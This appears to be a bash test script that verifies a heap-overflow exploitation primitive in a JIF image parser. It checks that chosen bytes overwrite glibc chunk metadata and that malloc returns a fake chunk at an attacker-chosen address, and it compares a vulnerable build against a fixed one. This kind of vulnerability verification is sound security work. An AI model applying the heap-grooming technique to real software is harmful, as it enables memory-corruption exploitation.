#!/usr/bin/env bash
# Downstream-allocator consumer of the chosen JIF bytes. Builds the verbatim
# pin against real glib + real zlib, grooms the adjacent 272-byte glibc chunk
# into the smallbin, and checks what glibc reads after the overflow.
set -u
cd "$(dirname "$0")"
mkdir -p evidence

GLIB_CFLAGS=$(pkg-config --cflags glib-2.0)
GLIB_LIBS=$(pkg-config --libs glib-2.0)
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt() { ! grep -q -- "$2" "$1" 2>/dev/null; }

hasf() { grep -qF -- "$2" "$1" 2>/dev/null; }
gcc -O0 -g -Wall -I. $GLIB_CFLAGS -o evidence/real-consumer-vuln \
  real-driver.c $GLIB_LIBS -lz -ldl && ok "consumer vulnerable build" \
  || bad "consumer vulnerable build"
gcc -O0 -g -Wall -I. $GLIB_CFLAGS -DVARIANT_FIXED \
  -o evidence/real-consumer-fixed real-driver.c $GLIB_LIBS -lz -ldl \
  && ok "consumer fixed build" || bad "consumer fixed build"

echo "== runs =="
for mode in consume consumesz consume-safe unlink unlinkpatch; do
  evidence/real-consumer-vuln "$mode" > "evidence/consumer-$mode.log" 2>&1
  echo "RC=$?" >> "evidence/consumer-$mode.log"
done
evidence/real-consumer-fixed consume > evidence/consumer-fixed.log 2>&1
echo "RC=$?" >> evidence/consumer-fixed.log

echo "== chosen bytes reach the adjacent allocator metadata =="
has evidence/consumer-consume.log "CONSUME_SIZE_WORD=4d4d4d4d4d4d4d4d" \
  && ok "JIF supplies 0x4d size word" || bad "JIF supplies 0x4d size word"
has evidence/consumer-consume.log \
  "POST_PIN A_size_word=4d4d4d4d4d4d4d4d A_fd=4d4d4d4d4d4d4d4d A_bk=4d4d4d4d4d4d4d4d" \
  && ok "chosen size/fd/bk words in adjacent free chunk" \
  || bad "chosen size/fd/bk words in adjacent free chunk"
has evidence/consumer-consumesz.log "CONSUME_SIZE_WORD=0000000000000210" \
  && ok "JIF supplies crafted 0x210 size word" \
  || bad "JIF supplies crafted 0x210 size word"
has evidence/consumer-consumesz.log \
  "POST_PIN A_size_word=0000000000000210 A_fd=4d4d4d4d4d4d4d4d A_bk=4d4d4d4d4d4d4d4d" \
  && ok "crafting the size word leaves chosen fd/bk intact" \
  || bad "crafting the size word leaves chosen fd/bk intact"

echo "== real glibc consumer reads the chosen words =="
has evidence/consumer-consume.log "RC=139" \
  && ok "chosen 0x4d metadata faults a post-pin malloc" \
  || bad "chosen 0x4d metadata faults a post-pin malloc"
has evidence/consumer-consumesz.log "RC=139" \
  && ok "crafted 0x210 size with chosen fd/bk faults a post-pin malloc" \
  || bad "crafted 0x210 size with chosen fd/bk faults a post-pin malloc"
gdb -q -batch -ex 'set pagination off' -ex 'run consume' \
  -ex 'bt 2' -ex 'p/x $rcx' --args ./evidence/real-consumer-vuln consume \
  > evidence/consumer-gdb.log 2>&1
has evidence/consumer-gdb.log "_int_malloc" \
  && ok "fault frame is glibc _int_malloc" || bad "fault frame is glibc _int_malloc"
has evidence/consumer-gdb.log "0x4d4d4d4d4d4d4d4d" \
  && ok "faulting pointer register holds the chosen bk word" \
  || bad "faulting pointer register holds the chosen bk word"

echo "== chosen-address fake chunk accepted by real glibc =="
has evidence/consumer-unlink.log "RC=0" \
  && ok "fake-chunk pair completes all ten post-pin allocations" \
  || bad "fake-chunk pair completes all ten post-pin allocations"
has evidence/consumer-unlink.log "UNLINK_RETURN_VICTIM=1" \
  && ok "post-pin malloc returns the corrupted adjacent chunk" \
  || bad "post-pin malloc returns the corrupted adjacent chunk"
has evidence/consumer-unlink.log "UNLINK_RETURN_FAKE=1" \
  && ok "post-pin malloc returns the fake chunk at the chosen address" \
  || bad "post-pin malloc returns the fake chunk at the chosen address"
has evidence/consumer-unlink.log "UNLINK_FD_WORD_CHANGED=1" \
  && ok "glibc writes the chosen fake chunk fd word" \
  || bad "glibc writes the chosen fake chunk fd word"

echo "== post-inflate shim patch supplies the fake-chunk words =="
has evidence/consumer-unlinkpatch.log "PATCH_HITS=1" \
  && ok "simulated shim patched the inflated payload once" \
  || bad "simulated shim patched the inflated payload once"
has evidence/consumer-unlinkpatch.log "UNLINK_RETURN_FAKE=1" \
  && ok "post-inflate patch still returns the lab-arranged fake chunk" \
  || bad "post-inflate patch still returns the lab-arranged fake chunk"
has evidence/consumer-unlinkpatch.log "UNLINK_FD_WORD_CHANGED=1" \
  && ok "post-inflate patch still makes glibc write the fake fd word" \
  || bad "post-inflate patch still makes glibc write the fake fd word"
has evidence/consumer-unlinkpatch.log "RC=0" \
  && ok "post-inflate patch completes all ten post-pin allocations" \
  || bad "post-inflate patch completes all ten post-pin allocations"
hasnt evidence/consumer-unlinkpatch.log "A_fd=4d4d" \
  && ok "patched fd word replaced the file-chosen 0x4d bytes" \
  || bad "patched fd word replaced the file-chosen 0x4d bytes"

echo "== controls =="
has evidence/consumer-consume-safe.log "RC=0" \
  && ok "safe 4x4 input completes all ten post-pin allocations" \
  || bad "safe 4x4 input completes all ten post-pin allocations"
hasf evidence/consumer-consume-safe.log "POST_PIN malloc260[9]=" \
  && ok "safe input drains the tcache/smallbin cleanly" \
  || bad "safe input drains the tcache/smallbin cleanly"
has evidence/consumer-fixed.log "RC=0 ERR=image data" \
  && ok "fixed pin rejects wrapped input" || bad "fixed pin rejects wrapped input"
hasf evidence/consumer-fixed.log "POST_PIN malloc260[9]=" \
  && ok "fixed pin leaves allocator metadata intact" \
  || bad "fixed pin leaves allocator metadata intact"
hasnt evidence/consumer-fixed.log "POST_PIN A_size_word=4d4d" \
  && ok "fixed pin has no chosen metadata write" \
  || bad "fixed pin has no chosen metadata write"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
